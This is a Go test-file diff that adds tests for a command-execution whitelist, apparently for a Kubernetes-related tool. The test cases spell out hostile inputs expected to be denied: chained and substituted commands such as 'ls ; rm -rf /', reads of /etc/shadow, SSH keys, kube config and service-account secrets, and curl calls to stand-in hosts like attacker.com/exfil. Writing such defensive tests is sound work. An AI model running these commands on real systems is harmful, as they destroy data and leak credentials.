@@ -79,6 +79,88 @@ func TestIsNamespaceBlocked(t *testing.T) {
 	}
 }
 
+func TestIsExecAllowed_DangerousPatterns(t *testing.T) {
+	w := defaultTestWhitelist()
+
+	cases := []struct {
+		cmd     string
+		allowed bool
+		desc    string
+	}{
+		{"ls $(whoami)", false, "command substitution $()"},
+		{"ls `whoami`", false, "command substitution backtick"},
+		{"ls | cat /etc/passwd", false, "pipe operator"},
+		{"ls >> /tmp/out", false, "append redirect >>"},
+		{"ls << EOF", false, "heredoc <<"},
+		{"ls ; rm -rf /", false, "semicolon chaining"},
+		{"ls && rm -rf /", false, "logical AND &&"},
+		{"ls || rm -rf /", false, "logical OR ||"},
+		{"cat /etc/shadow", false, "sensitive path /etc/shadow"},
+		{"cat /etc/passwd", false, "sensitive path /etc/passwd"},
+		{"cat /proc/self/environ", false, "sensitive path /proc/self/environ"},
+		{"cat /proc/self/cmdline", false, "sensitive path /proc/self/cmdline"},
+		{"ls /.ssh/id_rsa", false, "sensitive path .ssh"},
+		{"cat /.kube/config", false, "sensitive path .kube/config"},
+		{"cat /.env", false, "sensitive path .env"},
+		{"ls /var/run/secrets", false, "sensitive path /var/run/secrets"},
+		{"ls -la /tmp", true, "safe ls command"},
+		{"ps aux", true, "safe ps command"},
+	}
+
+	for _, tc := range cases {
+		got := w.IsExecAllowed(tc.cmd)
+		if got != tc.allowed {
+			t.Errorf("[%s] IsExecAllowed(%q) = %v, want %v", tc.desc, tc.cmd, got, tc.allowed)
+		}
+	}
+}
+
+func TestIsExecAllowed_CurlURLFiltering(t *testing.T) {
+	w := NewWhitelist(WhitelistConfig{
+		Exec: []string{"curl"},
+	})
+
+	cases := []struct {
+		cmd     string
+		allowed bool
+		desc    string
+	}{
+		{"curl http://attacker.com/exfil", false, "external HTTP URL"},
+		{"curl https://evil.io/steal", false, "external HTTPS URL"},
+		{"curl http://localhost:8080/metrics", true, "localhost URL"},
+		{"curl http://127.0.0.1:9090/api", true, "127.0.0.1 URL"},
+		{"curl http://prometheus.monitoring.svc.cluster.local/api", true, "cluster-local service URL"},
+		{"curl http://svc.cluster.local/health", true, ".svc.cluster. URL"},
+		{"curl -s http://myservice.local/ready", true, ".local/ URL"},
+		{"curl -v", true, "no URL argument"},
+	}
+
+	for _, tc := range cases {
+		got := w.IsExecAllowed(tc.cmd)
+		if got != tc.allowed {
+			t.Errorf("[%s] IsExecAllowed(%q) = %v, want %v", tc.desc, tc.cmd, got, tc.allowed)
+		}
+	}
+}
+
+func TestValidateExecCommand_FullArgInspection(t *testing.T) {
+	w := defaultTestWhitelist()
+
+	// Dangerous argument in slice form must also be caught.
+	allowed, reason := w.ValidateExecCommand([]string{"ls", "$(whoami)"})
+	if allowed {
+		t.Errorf("expected command substitution in args to be denied")
+	}
+	if reason == "" {
+		t.Error("expected a deny reason")
+	}
+
+	allowed, _ = w.ValidateExecCommand([]string{"cat", "/etc/passwd"})
+	if allowed {
+		t.Error("expected sensitive path in args to be denied")
+	}
+}
+
 func TestValidateExecCommand(t *testing.T) {
 	w := defaultTestWhitelist()
 
